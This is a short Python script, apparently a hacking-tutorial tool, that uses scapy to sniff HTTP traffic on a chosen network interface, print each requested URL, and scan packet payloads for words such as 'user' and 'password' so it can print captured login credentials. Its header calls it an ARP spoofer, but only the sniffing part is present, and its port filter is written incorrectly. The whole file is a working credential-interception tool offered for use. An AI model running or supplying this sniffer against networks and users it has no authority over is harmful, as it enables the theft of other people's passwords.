#! /usr/bin/python3
#Author : creepypirate
#ARP spoofer

import scapy.all as scapy
from scapy.layers import http
import argparse

parser=argparse.ArgumentParser()	
parser.add_argument("-i","--interface",dest="interface",help="Specify an interface to capture packets")
options = parser.parse_args()

def sniff(interface):

	scapy.sniff(iface = interface, store = False, prn = process_sniffed_packet,filter = "port 80" or "port 443")

def geturl(packet):
 
	return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
	if packet.haslayer(scapy.Raw):
		load = packet[scapy.Raw].load
		keywords = ['login','LOGIN','user','pass','username','password','Login']

		for keyword in keywords:
			if keyword in load.decode('utf-8'):
				return load

def process_sniffed_packet(packet):

	if packet.haslayer(http.HTTPRequest):
		url=geturl(packet)
		print("[+]HTTPRequest > " + url.decode('utf-8'))
		logininfo = get_login_info(packet)
		if logininfo:
			print("\n\n[+]Possible username and password "+ logininfo.decode('utf-8') +"\n\n")


sniff(options.interface)